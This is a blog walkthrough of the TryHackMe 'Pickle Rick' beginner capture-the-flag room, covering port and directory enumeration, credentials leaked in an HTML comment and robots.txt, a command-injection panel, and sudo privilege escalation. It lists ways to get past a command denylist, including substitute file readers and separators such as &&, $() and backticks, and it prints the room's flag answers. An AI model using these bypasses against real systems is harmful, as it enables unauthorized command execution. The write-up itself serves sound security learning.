---
title: "TryHackMe — Pickle Rick"
description: "Walkthrough of the Rick & Morty themed beginner web exploitation room. Three flags, www-data → root, classic enumeration → command injection → sudo privesc."
pubDate: 2026-05-04
tags: ["tryhackme", "ctf", "web", "linux", "easy"]
---

A short Rick-and-Morty themed web exploitation room. Three flags, one
`www-data` → `root` privilege escalation. Good first box for anyone learning
the loop *enumerate → web → command injection → linux privesc*.

<figure>
  <img src="/blog/pickle-rick/flow.svg" alt="kill chain: recon → web → auth → inject → privesc → root" />
  <figcaption>full kill-chain at a glance — six stages, one box.</figcaption>
</figure>

## Reconnaissance

Standard nmap sweep:

```bash
$ nmap -sC -sV -p- -T4 10.10.x.x
```

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Two open ports. Web first — SSH without creds is a dead end.

## Web enumeration

`curl http://10.10.x.x/` returns a Rick & Morty themed page asking us to
help Rick recover his lost ingredients. The HTML source has a comment:

```html
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

That's our username. Now content discovery:

```bash
$ gobuster dir -u http://10.10.x.x \
    -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

```text
/assets               (Status: 301)
/login.php            (Status: 200)
/portal.php           (Status: 302)
/robots.txt           (Status: 200)
```

`/robots.txt` is a single line:

```text
Wubbalubbadubdub
```

Not a path. That's the password. Classic.

## Flag 1 — command injection

`POST /login.php` with `R1ckRul3s` / `Wubbalubbadubdub` redirects us to
`/portal.php`, a "command panel" that takes user input and executes it on
the server. There's a denylist — `cat`, `nano`, `vim`, `head` are all
filtered. Bypass is trivial: the filter is a token blocklist, not a
behavior check.

<figure>
  <img src="/blog/pickle-rick/portal.svg" alt="portal.php session showing cat blocked, less working, flag 1 captured" />
  <figcaption>portal.php session — <code>cat</code> blocked, <code>less</code> sails right through.</figcaption>
</figure>

```bash
$ ls
```

```text
Sup3rS3cretPickl3Ingred.txt
clue.txt
denied.txt
index.html
robots.txt
```

`cat` is blocked. `less`, `more`, `tail` are not:

```bash
$ less Sup3rS3cretPickl3Ingred.txt
```

```text
mr. meeseek hair
```

> **Flag 1:** `mr. meeseek hair`

> **Lesson:** denylists for command injection are almost never complete. If
> `cat` is blocked, try `less`, `more`, `tac`, `nl`, `awk '{print}'`,
> `head -c 9999`, or read the file via PHP wrappers.

## Flag 2 — file system enumeration

`clue.txt` says: *look around the file system*. Spelunking:

```bash
$ ls /home
```

```text
rick
ubuntu
```

```bash
$ ls /home/rick
```

```text
"second ingredients"
```

The space and quotes break our injection. Pipe through `xargs` to dodge:

```bash
$ ls /home/rick | xargs -I{} less "/home/rick/{}"
```

```text
1 jerry tear
```

> **Flag 2:** `1 jerry tear`

## Flag 3 — privilege escalation

First privesc check on every Linux box, every time:

```bash
$ sudo -l
```

```text
User www-data may run the following commands on ip-10-10-x-x:
    (ALL) NOPASSWD: ALL
```

A free `sudo`. We're effectively root already.

<figure>
  <img src="/blog/pickle-rick/privesc.svg" alt="privilege ladder: anonymous → www-data → root" />
  <figcaption>three rungs: anonymous → www-data → root. each rung was a
    one-line command.</figcaption>
</figure>

```bash
$ sudo ls /root
$ sudo less /root/3rd.txt
```

```text
fleeb juice
```

> **Flag 3:** `fleeb juice`

## Lessons

- `robots.txt` and HTML comments still hide credentials in beginner CTFs — and in production sometimes too.
- Command-injection filters are usually denylists. `cat` blocked? Try `less`. `;` blocked? Try `&&`, `|`, `$()`, backticks, newline.
- `sudo -l` is the **first** privesc check, every time. `(ALL) NOPASSWD: ALL` is a free root shell.
- Read the room's hints — `clue.txt` literally said "look around the file system."

Three flags, ~25 minutes. Onward.
